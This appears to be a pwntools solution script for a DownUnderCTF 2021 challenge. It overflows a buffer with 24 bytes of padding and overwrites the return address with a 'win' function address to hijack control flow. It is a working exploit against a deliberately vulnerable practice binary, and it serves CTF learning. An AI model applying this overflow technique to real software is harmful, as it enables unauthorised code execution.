# -- coding: utf-8 --
from pwn import *

# ENV
PORT =  31921
HOST = "pwn-2021.duc.tf"
e = context.binary = ELF('./chall')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
pause()


# VARIABLE
win = 0x4011E7

# PAYLOAD
payload  = ''
payload += 'a' * 24
payload += p64(win)


r.sendlineafter('e it could play a song?', payload)


r.interactive()